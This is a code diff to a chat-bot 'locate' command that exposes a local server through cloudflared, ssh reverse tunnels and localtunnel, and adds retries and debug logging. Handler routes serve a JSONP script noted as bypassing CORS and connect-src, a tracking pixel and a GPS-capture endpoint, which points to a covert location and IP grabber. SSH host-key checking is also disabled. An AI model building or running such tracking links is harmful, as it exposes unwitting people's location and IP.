@@ -2,6 +2,7 @@ import { randomUUID } from "node:crypto";
 import { spawn, execFileSync } from "node:child_process";
 import { createServer, type Server } from "node:http";
 import { promises as fs, existsSync, mkdirSync } from "node:fs";
+import { tmpdir } from "node:os";
 import path from "node:path";
 import type { CommandContext } from "../../types/index.d.ts";
 import { fytBold } from "../../core/socketText.ts";
@@ -18,7 +19,10 @@ const startedRef: { current: boolean } = (G.__locStarted ??= { current: false })
 const TTL = 30 * 60 * 1000;
 const PORT = Number(process.env.LOCATE_PORT || 8787);
 const MASK = process.env.LOCATE_MASK_IP === "1";
+const DEBUG = process.env.LOCATE_DEBUG === "1";
 const GIF = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
+
+const log = (...a: any[]) => DEBUG && console.log("[locate]", ...a);
 
 function sweep() {
   const now = Date.now();
@@ -32,7 +36,15 @@ function maskIp(ip: string) {
 
 /* ───────────────────────── cloudflared ───────────────────────── */
 
-const BIN_DIR = path.join(process.cwd(), ".locate");
+function binDir() {
+  const local = path.join(process.cwd(), ".locate");
+  try { mkdirSync(local, { recursive: true }); return local; } catch {}
+  const alt = path.join(tmpdir(), "locate-cf");
+  try { mkdirSync(alt, { recursive: true }); return alt; } catch {}
+  return local;
+}
+
+const BIN_DIR = binDir();
 const BIN = path.join(BIN_DIR, process.platform === "win32" ? "cloudflared.exe" : "cloudflared");
 
 function assetName(): string | null {
@@ -53,11 +65,11 @@ async function ensureBinary(): Promise<string | null> {
   const name = assetName();
   if (!name) return null;
 
-  if (!existsSync(BIN_DIR)) mkdirSync(BIN_DIR, { recursive: true });
-
+  const c = new AbortController();
+  const timer = setTimeout(() => c.abort(), 15000);
   try {
     const url = `https://github.com/cloudflare/cloudflared/releases/latest/download/${name}`;
-    const r = await fetch(url, { redirect: "follow" });
+    const r = await fetch(url, { redirect: "follow", signal: c.signal });
     if (!r.ok) return null;
     const buf = Buffer.from(await r.arrayBuffer());
     if (buf.length < 100_000) return null;
@@ -67,45 +79,62 @@ async function ensureBinary(): Promise<string | null> {
       await fs.writeFile(tmp, buf);
       execFileSync("tar", ["-xzf", tmp, "-C", BIN_DIR], { stdio: "ignore" });
       await fs.unlink(tmp).catch(() => undefined);
-      await fs.chmod(BIN, 0o755).catch(() => undefined);
     } else {
       await fs.writeFile(BIN, buf);
-      await fs.chmod(BIN, 0o755).catch(() => undefined);
     }
-    console.log("[locate] cloudflared listo");
+    await fs.chmod(BIN, 0o755).catch(() => undefined);
+    log("cloudflared descargado");
     return BIN;
-  } catch {
+  } catch (e: any) {
+    log("descarga cloudflared falló:", e?.message);
     return null;
+  } finally {
+    clearTimeout(timer);
   }
 }
 
 /* ───────────────────────── túnel ───────────────────────── */
 
-const SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=30", "-o", "ExitOnForwardFailure=yes"];
+const SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=30", "-o", "ExitOnForwardFailure=yes", "-o", "ConnectTimeout=10"];
 
-type Provider = { cmd: string; args: string[]; re: RegExp };
+function has(cmd: string) {
+  try {
+    execFileSync(process.platform === "win32" ? "where" : "which", [cmd], { stdio: "ignore" });
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+type Provider = { name: string; cmd: string; args: string[]; re: RegExp };
 
 function provider(name: string, bin: string | null): Provider | null {
   const npx = process.platform === "win32" ? "npx.cmd" : "npx";
   switch (name) {
-    case "cf":
-      return bin ? { cmd: bin, args: ["tunnel", "--url", `http://127.0.0.1:${PORT}`, "--no-autoupdate"], re: /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i } : null;
     case "lhr":
-      return { cmd: "ssh", args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "nokey@localhost.run"], re: /https:\/\/[a-z0-9-]+\.lhr\.life/i };
-    case "lt":
-      return { cmd: npx, args: ["--yes", "localtunnel", "--port", String(PORT)], re: /https:\/\/[a-z0-9-]+\.loca\.lt/i };
+      if (!has("ssh")) return null;
+      return { name, cmd: "ssh", args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "nokey@localhost.run"], re: /https:\/\/[a-z0-9-]+\.lhr\.life/i };
     case "serveo":
-      return { cmd: "ssh", args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "serveo.net"], re: /https:\/\/[a-z0-9-]+\.serveo\.net/i };
+      if (!has("ssh")) return null;
+      return { name, cmd: "ssh", args: [...SSH_OPTS, "-R", `80:localhost:${PORT}`, "serveo.net"], re: /https:\/\/[a-z0-9-]+\.serveo\.net/i };
+    case "cf":
+      return bin ? { name, cmd: bin, args: ["tunnel", "--url", `http://127.0.0.1:${PORT}`, "--no-autoupdate"], re: /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i } : null;
+    case "lt":
+      if (!has(npx)) return null;
+      return { name, cmd: npx, args: ["--yes", "localtunnel", "--port", String(PORT)], re: /https:\/\/[a-z0-9-]+\.loca\.lt/i };
     default:
       return null;
   }
 }
 
-const tunnel = (G.__locTunnel ??= { url: "", proc: null as any, tries: 0, order: ["cf", "lhr", "lt", "serveo"] as string[] });
+const tunnel = (G.__locTunnel ??= {
+  url: "", proc: null as any, tries: 0,
+  order: ["lhr", "serveo", "cf", "lt"] as string[],
+  lastErr: "",
+});
 
 function baseUrl() {
-  const manual = (process.env.LOCATE_BASE_URL || "").replace(/\/+$/, "");
-  return manual || tunnel.url;
+  return (process.env.LOCATE_BASE_URL || "").replace(/\/+$/, "") || tunnel.url;
 }
 
 function killTunnel() {
@@ -129,28 +158,43 @@ async function alive(url: string) {
 function startTunnel(bin: string | null): Promise<string> {
   if (tunnel.proc) {
     return new Promise((r) => {
-      const t = setInterval(() => { if (tunnel.url || tunnel.tries > 8) { clearInterval(t); r(tunnel.url); } }, 300);
+      const t = setInterval(() => { if (tunnel.url || tunnel.tries > 12) { clearInterval(t); r(tunnel.url); } }, 300);
     });
   }
 
   const forced = process.env.LOCATE_TUNNEL;
-  const name = forced && forced !== "auto" ? forced : tunnel.order[tunnel.tries % tunnel.order.length];
+  const order = forced && forced !== "auto" ? [forced] : tunnel.order;
+  const name = order[tunnel.tries % order.length];
   const p = provider(name, bin);
-  if (!p) { tunnel.tries++; return Promise.resolve(""); }
+  if (!p) {
+    tunnel.tries++;
+    tunnel.lastErr = `${name}: binario no disponible`;
+    log("omitido", name);
+    return Promise.resolve("");
+  }
 
   return new Promise((resolve) => {
     let done = false;
     let child: any;
-    try { child = spawn(p.cmd, p.args, { stdio: ["ignore", "pipe", "pipe"] }); } catch { tunnel.tries++; return resolve(""); }
+    let tail = "";
+
+    try { child = spawn(p.cmd, p.args, { stdio: ["ignore", "pipe", "pipe"] }); } catch (e: any) {
+      tunnel.tries++;
+      tunnel.lastErr = `${name}: ${e?.message}`;
+      return resolve("");
+    }
     tunnel.proc = child;
 
     const finish = (v: string) => { if (done) return; done = true; clearTimeout(timer); resolve(v); };
 
     const onData = (buf: Buffer) => {
-      const m = buf.toString().match(p.re);
+      const txt = buf.toString();
+      if (DEBUG) tail = (tail + txt).slice(-400);
+      const m = txt.match(p.re);
       if (m && !tunnel.url) {
         tunnel.url = m[0].replace(/\/+$/, "");
         tunnel.tries = 0;
+        tunnel.lastErr = "";
         console.log(`[locate] túnel ${name} → ${tunnel.url}`);
         finish(tunnel.url);
       }
@@ -158,24 +202,44 @@ function startTunnel(bin: string | null): Promise<string> {
 
     child.stdout?.on("data", onData);
     child.stderr?.on("data", onData);
-    child.on("exit", () => { if (tunnel.proc === child) { tunnel.proc = null; tunnel.url = ""; } if (!done) { tunnel.tries++; finish(""); } });
-    child.on("error", () => { tunnel.proc = null; tunnel.tries++; finish(""); });
+    child.on("exit", (code: number) => {
+      if (tunnel.proc === child) { tunnel.proc = null; tunnel.url = ""; }
+      if (!done) {
+        tunnel.tries++;
+        tunnel.lastErr = `${name}: salió (${code}) ${tail.split("\n").filter(Boolean).pop() || ""}`.slice(0, 220);
+        finish("");
+      }
+    });
+    child.on("error", (e: any) => {
+      tunnel.proc = null;
+      tunnel.tries++;
+      tunnel.lastErr = `${name}: ${e?.message}`;
+      finish("");
+    });
 
     const timer = setTimeout(() => {
-      if (!tunnel.url) { try { child.kill("SIGKILL"); } catch {} tunnel.proc = null; tunnel.tries++; finish(""); }
-    }, 22000);
+      if (!tunnel.url) {
+        try { child.kill("SIGKILL"); } catch {}
+        tunnel.proc = null;
+        tunnel.tries++;
+        tunnel.lastErr = `${name}: timeout`;
+        finish("");
+      }
+    }, 14000);
   });
 }
 
 async function ensureTunnel(): Promise<string> {
-  if (baseUrl() && tunnel.proc && (await alive(baseUrl()))) return baseUrl();
+  const cur = baseUrl();
+  if (cur && tunnel.proc && (await alive(cur))) return cur;
+  if (cur && !tunnel.proc && (await alive(cur))) return cur;
 
   killTunnel();
   const bin = await ensureBinary();
 
-  for (let i = 0; i < 4; i++) {
+  for (let i = 0; i < 6; i++) {
     const url = await startTunnel(bin);
-    if (!url) { await new Promise((r) => setTimeout(r, 700)); continue; }
+    if (!url) { await new Promise((r) => setTimeout(r, 600)); continue; }
     if (await alive(url)) return url;
     killTunnel();
   }
@@ -229,12 +293,11 @@ function send(res: any, code: number, type: string, body: any) {
 
 async function handle(req: any, res: any) {
   const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
-  const pathname = url.pathname;
+  const p = url.pathname;
 
-  if (pathname === "/__hc") return send(res, 200, "text/plain", "ok");
+  if (p === "/__hc") return send(res, 200, "text/plain", "ok");
 
-  /* script JSONP — sin CORS ni connect-src */
-  const j = pathname.match(/^\/j\/([A-Za-z0-9_-]{6,48})\.js$/);
+  const j = p.match(/^\/j\/([A-Za-z0-9_-]{6,48})\.js$/);
   if (j) {
     const s = sessions.get(j[1]);
     if (!s) return send(res, 200, "application/javascript", "if(window.__locFail)window.__locFail();");
@@ -247,8 +310,7 @@ async function handle(req: any, res: any) {
     return;
   }
 
-  /* mapa proxyado */
-  const m = pathname.match(/^\/m\/([A-Za-z0-9_-]{6,48})$/);
+  const m = p.match(/^\/m\/([A-Za-z0-9_-]{6,48})$/);
   if (m) {
     const lat = Number(url.searchParams.get("lat"));
     const lon = Number(url.searchParams.get("lon"));
@@ -267,8 +329,7 @@ async function handle(req: any, res: any) {
     }
   }
 
-  /* GPS por GET + pixel */
-  const l = pathname.match(/^\/l\/([A-Za-z0-9_-]{6,48})$/);
+  const l = p.match(/^\/l\/([A-Za-z0-9_-]{6,48})$/);
   if (l) {
     send(res, 200, "image/gif", GIF);
     const s = sessions.get(l[1]);
@@ -405,7 +466,11 @@ export default {
     const base = await ensureTunnel();
     if (!base) {
       await react("❌").catch(() => undefined);
-      await reply(`${fytBold("Sin túnel")}: revisa que haya red y espacio en disco.`).catch(() => undefined);
+      await reply(
+        `${fytBold("Sin túnel")}.\n\n` +
+          `Último error: ${tunnel.lastErr || "desconocido"}\n\n` +
+          `Activa *LOCATE_DEBUG=1* para ver el detalle, o fuerza uno con *LOCATE_TUNNEL=ssh|cf|lt*.`,
+      ).catch(() => undefined);
       return;
     }
 
